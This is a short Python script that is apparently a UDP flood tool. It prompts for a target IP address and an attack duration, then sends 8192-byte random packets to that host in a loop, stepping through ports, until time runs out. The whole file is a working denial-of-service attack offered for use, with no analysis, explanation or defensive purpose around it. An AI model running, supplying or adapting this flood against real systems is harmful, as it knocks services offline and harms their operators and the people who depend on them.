import random
import sys
import os
import socket
import time

os.system("cls")
port = 443
ip = input("\nEnter IP: ")
dur = int(input("\nEnter duration of attack: "))
bytes = os.urandom(8192)
socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sent = int(0)
timeout = time.time()+dur
while 1 == 1:
    try:
        if time.time()>timeout:
            sys.exit()
        else:
            socket.sendto(bytes,(ip,port))
            sent = sent+1
            if port == 65535:
                port = 1
            else:
                port = port+1
                print(sent,ip,port)
    except KeyboardInterrupt:
        sys.exit()